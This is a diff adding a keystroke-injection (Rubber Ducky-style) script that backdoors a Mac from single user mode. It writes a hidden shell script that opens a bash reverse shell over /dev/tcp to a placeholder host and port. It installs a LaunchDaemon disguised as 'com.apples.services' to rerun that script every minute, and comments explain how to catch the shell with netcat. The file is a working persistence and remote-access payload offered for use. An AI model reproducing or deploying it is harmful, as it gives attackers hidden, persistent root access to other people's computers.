@@ -1,0 +1,69 @@
+REM Patrick Mosca
+REM A simple script for rooting OSX from single user mode.
+REM Change mysite.com to your domain name or IP address
+REM Change 1337 to your port number
+REM Catch the shell with 'nc -l -p 1337'
+REM http://patrickmosca.com/root-a-mac-in-10-seconds-or-less/
+DELAY 1000
+STRING mount -uw /
+ENTER
+DELAY 2000
+STRING mkdir /Library/.hidden
+ENTER
+DELAY 200
+STRING echo '#!/bin/bash
+ENTER
+STRING bash -i >& /dev/tcp/mysite.com/1337 0>&1
+ENTER
+STRING wait' > /Library/.hidden/connect.sh
+ENTER
+DELAY 500
+STRING chmod +x /Library/.hidden/connect.sh
+ENTER
+DELAY 200
+STRING mkdir /Library/LaunchDaemons
+ENTER
+DELAY 200
+STRING echo '<plist version="1.0">
+ENTER
+STRING <dict>
+ENTER
+STRING <key>Label</key>
+ENTER
+STRING <string>com.apples.services</string>
+ENTER
+STRING <key>ProgramArguments</key>
+ENTER
+STRING <array>
+ENTER
+STRING <string>/bin/sh</string>
+ENTER
+STRING <string>/Library/.hidden/connect.sh</string>
+ENTER
+STRING </array>
+ENTER
+STRING <key>RunAtLoad</key>
+ENTER
+STRING <true/>
+ENTER
+STRING <key>StartInterval</key>
+ENTER
+STRING <integer>60</integer>
+ENTER
+STRING <key>AbandonProcessGroup</key>
+ENTER
+STRING <true/>
+ENTER
+STRING </dict>
+ENTER
+STRING </plist>' > /Library/LaunchDaemons/com.apples.services.plist
+ENTER
+DELAY 500
+STRING chmod 600 /Library/LaunchDaemons/com.apples.services.plist
+ENTER
+DELAY 200
+STRING launchctl load /Library/LaunchDaemons/com.apples.services.plist
+ENTER
+DELAY 1000
+STRING shutdown -h now
+ENTER
